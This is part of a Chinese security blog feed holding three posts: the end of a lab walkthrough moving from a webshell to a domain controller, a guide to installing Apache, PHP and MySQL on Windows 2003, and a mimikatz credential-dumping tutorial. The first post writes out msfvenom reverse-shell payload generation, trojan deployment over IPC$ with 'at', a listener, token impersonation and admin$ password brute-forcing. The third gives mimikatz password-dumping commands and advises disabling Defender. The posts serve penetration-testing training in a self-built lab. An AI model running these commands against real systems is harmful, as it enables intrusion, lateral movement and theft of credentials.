<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519141307_QYTX7T_Screenshot.jpeg" alt=""></p>
<h4 id="上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER-，下面我们尝试使用IPC-入侵DMEMBER1这台级别和我们相当的域主机。"><a href="#上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER-，下面我们尝试使用IPC-入侵DMEMBER1这台级别和我们相当的域主机。" class="headerlink" title="上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER ，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。"></a>上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER ，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。</h4><h2 id="0x06-IPC-入侵"><a href="#0x06-IPC-入侵" class="headerlink" title="0x06. IPC$ 入侵"></a>0x06. IPC$ 入侵</h2><h4 id="这里其实我们可以直接使用ms08-067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC-入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1-建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at-任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1-的反弹shell"><a href="#这里其实我们可以直接使用ms08-067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC-入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1-建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at-任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1-的反弹shell" class="headerlink" title="这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1 建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell."></a>这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1 建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.111 lport=4444 -f exe -o msf.exe	\\利用msf生成木马</div><div class="line">net use \\dmember1\ipc$                 //建立ipc$空连接</div><div class="line">copy c:\msf.exe \\dmember1\c$\msf.exe		//拷贝木马到目标机器上面去</div><div class="line">net time \\dmember1						//查看目标的时间</div><div class="line">at \\dmember1 2:35 %path%\msf.exe		//利用at任务执行木马，记住删除任务</div><div class="line">###################################</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519143905_hSTWQg_Screenshot.jpeg" alt=""></p>
<h4 id="现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。"><a href="#现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。" class="headerlink" title="现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。"></a>现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">run</div></pre></td></tr></table></figure>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519144432_cknEUr_Screenshot.jpeg" alt=""></p>
<h2 id="0x07-获取域控"><a href="#0x07-获取域控" class="headerlink" title="0x07. 获取域控"></a>0x07. 获取域控</h2><h4 id="当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…"><a href="#当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…" class="headerlink" title="当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…"></a>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use incognito </div><div class="line">list_tokens –u #列出可用token，假如找到域控token </div><div class="line">impersonate_token lab\\administrator</div></pre></td></tr></table></figure>
<h4 id="下面我换一种方式得到域控的shell："><a href="#下面我换一种方式得到域控的shell：" class="headerlink" title="下面我换一种方式得到域控的shell："></a>下面我换一种方式得到域控的shell：</h4><h4 id="首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上"><a href="#首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上" class="headerlink" title="首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上"></a>首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519154516_dBVly7_Screenshot.jpeg" alt=""></p>
<h4 id="接着我们依旧用administrator账号登陆w2k3利用爆破脚本对-admin-进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！"><a href="#接着我们依旧用administrator账号登陆w2k3利用爆破脚本对-admin-进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！" class="headerlink" title="接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！"></a>接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！</h4><blockquote>
<p>ipccrack.bat dcserver admin$ password.txt</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519160306_EFdL1v_Screenshot.jpeg" alt=""></p>
<h4 id="账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透"><a href="#账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透" class="headerlink" title="账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透"></a>账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519161150_GlFrvt_Screenshot.jpeg" alt=""></p>
<h2 id="0x08-结语"><a href="#0x08-结语" class="headerlink" title="0x08. 结语"></a>0x08. 结语</h2><h4 id="此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载："><a href="#此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：" class="headerlink" title="此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载："></a>此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：</h4><h4 id="网盘链接-密码-fcxx"><a href="#网盘链接-密码-fcxx" class="headerlink" title="网盘链接:  密码:fcxx"></a><a href="https://pan.baidu.com/s/1rp9jP3SLycSgrhqs7AxyXQ" target="_blank" rel="external">网盘链接:</a>  密码:fcxx</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-引言&quot;&gt;&lt;a href=&quot;#0x00-引言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 引言&quot;&gt;&lt;/a&gt;0x00. 引言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！&quot;&gt;&lt;a href=&quot;#emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。&lt;a href=&quot;http://www.freebuf.com/articles/network/172578.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;本文已投freebuf，禁止转载！&lt;/a&gt;&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin</title>
    <link href="http://TimeS0ng.github.io/2018/05/15/win2003-%E4%B8%8B%E6%90%AD%E5%BB%BAApache2-PHP5-Mysql-phpMyAdmin/"/>
    <id>http://TimeS0ng.github.io/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/</id>
    <published>2018-05-15T10:26:18.000Z</published>
    <updated>2018-12-18T15:34:31.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！"><a href="#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！" class="headerlink" title="&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！"></a>&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到<a href="https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA" target="_blank" rel="external">我的云盘</a>  密码:8r5k，节约大家搜集软件的时间！</h4><a id="more"></a>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515161655_XsJ6cp_Screenshot.jpeg" alt=""></p>
<h2 id="0x01-搭建Apache2-2"><a href="#0x01-搭建Apache2-2" class="headerlink" title="0x01. 搭建Apache2_2"></a>0x01. 搭建Apache2_2</h2><blockquote>
<ol>
<li>运行apache2.2.10-win32-x86-no_ssl.msi</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162134_VYC3ZY_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>一路下一步，到了域名那里随便填一个域名就可以了，接着下一步选择Custom 模式自定义安装</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162424_q4MzyV_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>然后选择Apache Http Server 2.2.10，再点击change改变安装目录为C:\apm\apache2</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163752_P2zqe4_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>再一路默认就安装好了，在右下角有apache的图标，到目前为止apache就安装好了</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515184948_S8kjnH_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-安装PHP5"><a href="#0x02-安装PHP5" class="headerlink" title="0x02. 安装PHP5"></a>0x02. 安装PHP5</h2><blockquote>
<ol>
<li>将PHP5 文件夹拖到C:\apm\ 文件夹下</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163959_KVEfGb_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>将php5 文件下面的php.ini-development 文件修改为php.ini</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164353_J0zlrX_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>（1）打开php.ini 将 ; extension_dir = “./“ 修改为extension_dir = “c:\apm\php5\ext”  ; </li>
</ol>
<p>（2）去掉 extension=php_gd2.dll，extension=php_mbstring.dll，extension=php_mysql.dll, extension=php_mysqli.dll 前面的 ; </p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164814_CEmJ79_Screenshot.jpeg" alt=""></p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172545_QSyuFx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>（1）打开c:\apm\apache2\conf\httpd.conf 配置文件，找到DirectoryIndex index.html，修改为DirectoryIndex index.html index.php login.php</li>
</ol>
<p>（2）找到 #LoadModule vhost_alias_module modules/mod_vhost_alias.so 在这行的后面添加以下内容：</p>
</blockquote>
<p>“””</p>
<p>LoadModule php5_module “c:/apm/php5/php5apache2_2.dll”</p>
<p>AddType application/x-httpd-php .php</p>
<p>PHPIniDir “c:/apm/php5/php.ini”</p>
<p>“””</p>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170629_zXk59X_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>添加系统环境变量，将 ;c:\apm\php5;c:\apm\php5\ext 加到环境变量后面</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170927_ajfy4v_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>重启计算机就能看到已经将PHP整合到Apache中了，此时已经可以解析php文件</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515171051_ibNpr4_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-安装phpMyAdmin"><a href="#0x03-安装phpMyAdmin" class="headerlink" title="0x03. 安装phpMyAdmin"></a>0x03. 安装phpMyAdmin</h2><blockquote>
<p>将phpMyAdmin 文件夹放到c:\apm\apache2\htdocs 文件夹下面，在目录中找到一个名为config.sample.inc.php的文件，将此文件复制一份并命名为config.inc.php，这个文件就是phpMyAdmin的配置文件了，重启apache就可以了</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172728_TN0Ix7_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-安装Mysql"><a href="#0x04-安装Mysql" class="headerlink" title="0x04. 安装Mysql"></a>0x04. 安装Mysql</h2><blockquote>
<ol>
<li>打开mysql-5.5.60-win32.msi ，一路下一步，大致步骤和Apache相似，在“Developer Components（开发者部分）”上左键单击，选择“This feature, and all subfeatures, will be installed on local hard drive.”</li>
</ol>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172205_F4qTTj_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"><a href="#其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。" class="headerlink" title="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"></a>其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 前言&quot;&gt;&lt;/a&gt;0x00. 前言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！&quot;&gt;&lt;a href=&quot;#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到&lt;a href=&quot;https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;我的云盘&lt;/a&gt;  密码:8r5k，节约大家搜集软件的时间！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows密码抓取总结</title>
    <link href="http://TimeS0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/"/>
    <id>http://TimeS0ng.github.io/2018/04/20/Windows密码抓取总结/</id>
    <published>2018-04-20T15:39:10.000Z</published>
    <updated>2018-12-18T15:37:48.133Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"><a href="#渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。" class="headerlink" title="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"></a>渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。</h4><a id="more"></a>
<blockquote>
<p> [本教程具有一定攻击性，仅限于教学使用，不得用于其他用途]</p>
</blockquote>
<h2 id="0x01-利用mimikatz获取明文密码"><a href="#0x01-利用mimikatz获取明文密码" class="headerlink" title="0x01. 利用mimikatz获取明文密码"></a>0x01. 利用mimikatz获取明文密码</h2><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）"><a href="#emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）" class="headerlink" title="&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）"></a>&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）</h4><h4 id="emsp-emsp-mimikatz-trunk-emsp-download-here"><a href="#emsp-emsp-mimikatz-trunk-emsp-download-here" class="headerlink" title="&emsp;&emsp;mimikatz_trunk &emsp;// download here"></a>&emsp;&emsp;mimikatz_trunk &emsp;// <a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行"><a href="#1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行" class="headerlink" title="1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)"></a>1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418203056_WR5Aim_Screenshot.jpeg" alt=""></p>
<h4 id="2-紧接着再进入mimikatz，运行命令"><a href="#2-紧接着再进入mimikatz，运行命令" class="headerlink" title="2. 紧接着再进入mimikatz，运行命令"></a>2. 紧接着再进入mimikatz，运行命令</h4><blockquote>
<p>privilege::debug</p>
<p>sekurlsa::logonpasswords</p>
</blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418205101_7Jvn4f_Screenshot.jpeg" alt=""></p>
<blockquote>
<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418204329_wHS2Qi_Screenshot.jpeg" alt=""></p>
</blockquote>
<h4 id="3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"><a href="#3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文" class="headerlink" title="3. 此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"></a>3. 此时我们就能得到username，password的密文，给大家推荐个<a href="https://www.somd5.com" target="_blank" rel="external">网站-here</a>，这里可以很容易的解密大多数密文</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418204918_4DUANd_Screenshot.jpeg" alt=""></p>
